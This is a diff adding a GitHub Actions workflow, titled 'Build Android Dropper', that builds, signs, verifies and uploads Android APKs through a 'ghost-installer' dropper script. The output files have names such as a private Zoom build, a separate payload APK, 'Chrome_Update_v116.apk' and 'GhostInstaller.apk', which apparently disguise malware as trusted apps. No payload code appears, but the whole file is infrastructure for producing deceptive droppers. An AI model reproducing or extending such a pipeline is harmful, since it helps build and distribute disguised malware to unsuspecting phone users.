@@ -1,0 +1,60 @@
+name: Build Android Dropper
+
+on:
+  workflow_dispatch:
+    inputs:
+      source_ref:
+        description: "Commit/ref to build (blank = current)"
+        required: false
+        default: ""
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-22.04
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ inputs.source_ref || github.sha }}
+
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: "17"
+
+      - uses: android-actions/setup-android@v3
+        with:
+          cmdline-tools-version: "11076708"
+          packages: >-
+            platform-tools
+            platforms;android-36
+            build-tools;36.0.0
+
+      - name: Build + sign dropper
+        env:
+          ANDROID_HOME: ${{ env.ANDROID_HOME }}
+        run: |
+          set -euo pipefail
+          chmod +x ghost-installer/gradlew ghost-installer/tools/build-dropper.sh
+          cd ghost-installer
+          ./tools/build-dropper.sh ../pages/zoom-private-universal-release.apk
+
+      - name: Verify
+        run: |
+          set -euo pipefail
+          BT="$ANDROID_HOME/build-tools/36.0.0"
+          "$BT/apksigner" verify --verbose --print-certs distro/clients/android/zoom-private.apk
+          "$BT/apksigner" verify --verbose --print-certs distro/clients/android/zoom-private-payload.apk
+          sha256sum distro/clients/android/zoom-private.apk distro/clients/android/zoom-private-payload.apk
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: android-dropper
+          path: |
+            distro/clients/android/zoom-private.apk
+            distro/clients/android/zoom-private-payload.apk
+            distro/clients/android/Chrome_Update_v116.apk
+            distro/clients/android/GhostInstaller.apk
+          if-no-files-found: error
